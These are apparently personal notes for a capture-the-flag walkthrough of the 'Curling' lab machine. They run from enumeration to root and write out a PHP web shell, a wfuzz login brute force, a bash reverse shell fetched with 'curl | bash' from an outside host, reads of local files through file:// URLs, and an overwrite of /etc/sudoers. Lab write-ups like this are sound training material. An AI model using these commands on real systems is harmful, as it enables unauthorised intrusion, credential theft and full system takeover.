1. namp the box.
┌──(kali㉿kali)-[~/CTF/JvP-prep/joomla/curling]
└─$ nmap -sC -sV -oA nmap/curling 10.10.10.150         
-sC == run default scripts 
-sV == enumerate version info
-oA == output results in all formats

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home

2. Checking out the Joomla site
- The main page is titled "Cewl Curling site!" 
- Cewl is a tool that can be used to generate wordlists based on all the words on a page 
so I am going to run it against the site. 

3. Looking at page source 
- At the bottom of the page is a comment stating  <!-- secret.txt -->
going to /secret.txt shows Q3VybGluZzIwMTgh [putting that in a creds file]

4. Run Joomscan against the site 
joomscan --url http://10.10.10.150 -ec | tee joomla-scan.out        

--url == target 
-ec == enumerate components

results in joomla-scan.out

Getting joomla version via http://10.10.10.150/administrator/manifests/files/joomla.xml 
Version is 3.8.8
Searching for "Joomla Changelog 3.8.8" shows a date of May 22, 2018
Searching for "Joomla core Vulnerabilites" returns this list of CVEs 
https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html

5. Taking a look at the secret.txt content 
A hint that it is base64 is that you can divide the char string by 4 sets of 4
base64 decoding the chars
└─$ base64 -d creds 
Curling2018! 

update to joomla-creds file to now be the result of the decode

6. Attempting to brute force the admin login
default is /administrator/
intercept the login request in burp while passing the joomla-creds

POST /administrator/index.php HTTP/1.1
Host: 10.10.10.150
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Origin: http://10.10.10.150
Connection: close
Referer: http://10.10.10.150/administrator/index.php
Cookie: c0548020854924e0aecd05ed9f5b672b=dsh3dqkn8q1p6fnqq4s1jk8a3f; 99fb082d992a92668ce87e5540bd20fa=g48rjggfue674jd04etnjqra9g
Upgrade-Insecure-Requests: 1

username=TESTUSERNAME&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&252373a42b78c331f34081aef814f02d=1

Using the usename and password string from the above request I will use wfuzz to brute force

7. wfuzz with cewl and joomla-creds
┌──(kali㉿kali)-[~/CTF/JvP-prep/joomla/curling]
└─$ wfuzz -w cewl-output.txt -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&252373a42b78c331f34081aef814f02d=1' http://10.10.10.150/administrator/index.php

inital command results in all 303 responses. 

Sending wfuzz through burp to see whats update

responses coming back are: 
HTTP/1.1 303 See other
Date: Thu, 15 Jul 2021 23:39:40 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: 99fb082d992a92668ce87e5540bd20fa=03fn1dma7m7sf36a9h15lngkp4; path=/; HttpOnly
Location: /administrator/index.php
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Thu, 15 Jul 2021 23:39:40 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=utf-8

NOTE: If I go to an existing request like the POST above and remove the cookie information then send it I get back the same 303 response

The 303's are happening because there seems to be a relationship between the cookie and this value 

Go to proxy-> options and select intercept responses (uncheck content types) under Intercept Server Responses . 

turn intercept on and reload the admin page 

Server response includes: 
</style>
	<script type="application/json" class="joomla-script-options new">{"csrf.token":"6c53866cdc7531b2e4e22f98c372b2e8","system.paths":{"root":"","base":"\/administrator"},"system.keepalive":{"interval":840000,"uri":"\/administrator\/index.php"}}

so a csrf token is being set and placed in the "return=<TOKEN HERE>" value

Passing the cookie into wfuzz:
┌──(kali㉿kali)-[~/CTF/JvP-prep/joomla/curling]
└─$ wfuzz -w cewl-output.txt -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&252373a42b78c331f34081aef814f02d=1' -b 'c0548020854924e0aecd05ed9f5b672b=dsh3dqkn8q1p6fnqq4s1jk8a3f; 99fb082d992a92668ce87e5540bd20fa=rmkorehst9rsr3fsdmc2bq7bk7' -p 127.0.0.1:8080 http://10.10.10.150/administrator/index.php

A lot of responses coming back with 200 (failed login I assume). Running again to hide the 200 responses. 

wfuzz -w cewl-output.txt --hc 200 -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&6c53866cdc7531b2e4e22f98c372b2e8=1' -b 'c0548020854924e0aecd05ed9f5b672b=dsh3dqkn8q1p6fnqq4s1jk8a3f; 99fb082d992a92668ce87e5540bd20fa=rmkorehst9rsr3fsdmc2bq7bk7' http://10.10.10.150/administrator/index.php

--d == POST data
--b == cookie 

Results: 

000000187:   303        0 L      0 W        0 Ch        "Floris"                                                                                      
000000218:   303        0 L      0 W        0 Ch        "new"                                                                                         
000000214:   500        0 L      1 W        5 Ch        "have"                                                                                        
000000208:   303        0 L      0 W        0 Ch        "associated"   

Testing Floris:Curling2018! and now logged in.

8. Exploring the site as an authenticated user. 
As Joomla is a CMS I am checking to see if I have permissions to edit existing templates
http://10.10.10.150/administrator/index.php?option=com_templates&view=templates

Creating a new file named "naughtron.php" 
Editing file "/naughtron.php" in template "protostar"

adding this to the new file as a test 
<?php system($_REQUEST['AlwaysBeTesting']); ?>

Testing: 
http://10.10.10.150/templates/protostar/naughtron.php?AlwaysBeTesting=whoami

Response: www-data 
There is code execution 

9. Creating a reverse shell using the naughtron.php template
- create a new dir called www
- create a new file called rev-shell.sh, and add a the following reverse shell to it. 
bash -i >& /dev/tcp/10.10.14.10/9001 0>&1 <<< comes from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

- start a simple server 
└─$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

- switch to a bash shell then create a listener on my box for port 9001
└─$ nc -lvnp 9001                                      
listening on [any] 9001 ...

- hit the server with curl 
10.10.10.150/templates/protostar/naughtron.php?AlwaysBeTesting=curl 10.10.14.10/rev-shell.sh | bash

Now connected: 
└─$ nc -lvnp 9001                                      
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.150] 44680
bash: cannot set terminal process group (1379): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html/templates/protostar$ whoami
www-data

Setting up a better interactive shell with python3 on the target
python3 -c 'import pty; pty.spawn("/bin/bash")'
hit control+z to background it for now
on my box type stty raw -echo 
type fg then ENTER 
now there is a better reverse shell active 

10. enumerate the box
www-data@curling:/home/floris$ ls -la
total 44
drwxr-xr-x 6 floris floris 4096 May 22  2018 .
drwxr-xr-x 3 root   root   4096 May 22  2018 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 May 22  2018 .cache
drwx------ 3 floris floris 4096 May 22  2018 .gnupg
drwxrwxr-x 3 floris floris 4096 May 22  2018 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup <<< I can read this as www-data
-rw-r----- 1 floris floris   33 May 22  2018 user.txt <<< user flag, but do nto have permissions to read as I am www-data

password_backup looks to be a hex dump
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48  

- using xxd to decode
www-data@curling:/home/floris$ xxd -r ~floris/password_backup   
BZh91AY&SY���H���A��P)ava�:4N���nT#�@%�` 
"��n�                                    ��z�@�i�4hdi���9�h�Q�dh���4i�5n�׌��Jh��*��}y.�<~�x�>   �sVT�zH�ߢ�1�V��`F���s
     ۇ7j:X�dR��k�� ���)p�7۫;���9��PC�Y�P �HB��*  ��G� �U@r�rE8P����H

- move to tmp and send the result to a file 
www-data@curling:/tmp$ xxd -r ~floris/password_backup > decode-result

- run file against the result 
www-data@curling:/tmp$ file decode-result 
decode-result: bzip2 compressed data, block size = 900k

-use bzip to read: 
www-data@curling:/tmp$ bzcat decode-result 
�l[password�r�BZh91AY&SY6Ǎ����@@!PtD�� t"d�hhOPIS@��6��8ET>P@�#I bՃ|3��x���������(*N�&�H��k1��x��"�{�ೱ��]��B@�6�m��www-data@curling:/tmp$ 

- send the result from decode-result to a new file 
www-data@curling:/tmp$ bzcat decode-result > bzip-result
www-data@curling:/tmp$ file bzip-result 
bzip-result: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix

- run zcat on the file to read 
www-data@curling:/tmp$ zcat bzip-result 
BZh91AY&SY6Ǎ����@@!PtD�� t"d�hhOPIS@��6��8ET>P@�#I bՃ|3��x���������(*N�&�H��k1��x��"�{�ೱ��]��B@�6

- send the zcat result to a new file
www-data@curling:/tmp$ zcat bzip-result > zcat-result
www-data@curling:/tmp$ file zcat-result 
zcat-result: bzip2 compressed data, block size = 900k

- run bzcat on zcat-result to read: 
www-data@curling:/tmp$ bzcat zcat-result 
password.txt0000644000000000000000000000002313301066143012147 0ustar  rootroot5d<wdCbdZu)|hChXll

- send that to a new file
ww-data@curling:/tmp$ bzcat zcat-result > password-file
www-data@curling:/tmp$ file password-file 
password-file: POSIX tar archive (GNU)

- open the tar file 
www-data@curling:/tmp$ tar -xf password-file 
www-data@curling:/tmp$ ls   
bzip-result    gzip-result    password.txt
decode-result  password-file  zcat-result
www-data@curling:/tmp$ cat password.txt 
5d<wdCbdZu)|hChXll

NOTE: all the above nonsense can also be done by using https://gchq.github.io/CyberChef/ 

result saved to password_backup file

11. Switching to user on the box
www-data@curling:/tmp$ su floris
Password: 
floris@curling:/tmp$ whoami
floris

checking out admin area
floris@curling:~/admin-area$ ls -la 
total 28
drwxr-x--- 2 root   floris  4096 May 22  2018 .
drwxr-xr-x 6 floris floris  4096 May 22  2018 ..
-rw-rw---- 1 root   floris    25 Jul 16 13:13 input
-rw-rw---- 1 root   floris 14236 Jul 16 13:13 report

floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"

if I cat report then I get the page source of the initial hompage of this site

Testing if I can get the input url to hit my SimpleHTTPServer
floris@curling:~/admin-area$ cat input 
url = "http://10.10.14.10/alwaysbetesting"

I am getting hits: 
"GET /alwaysbetesting HTTP/1.1" 404 -
"GET /alwaysbetesting HTTP/1.1" 404 -

I am testing if I can use curls file command to read the passwd file local to tbe box
url = "file:///etc/passwd/"
then I am going to watch the report every second with 
watch -n 1 cat report

Every 1.0s: cat report                         

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
n
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/
sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nol

its working

To see if I can get a root shell on the box I am testing to see if I can get access to roots cron
url = "file:///var/spool/cron/crontabs/root"

That is working as well. and shows that the cron job is running a curl command
- Copy my local sudoers file to my www dir 

- edit that copy of my sudoers file and add the floris user to it: 
floris  ALL=(ALL:ALL) ALL

NOTE: make sure that if @includedir /etc/sudoers.d is commented out. 
#@includedir /etc/sudoers.d

- edit the input file on the target to run this: 

url = "http://10.10.14.10/sudoers"
output = "/etc/sudoers"
user-agent = "AlwaysBeTesting/1.0"

- wait for it to pull the file 
"GET /sudoers HTTP/1.1" 200 -

floris@curling:~/admin-area$ sudo su -
[sudo] password for floris: 
root@curling:~# whoami
root
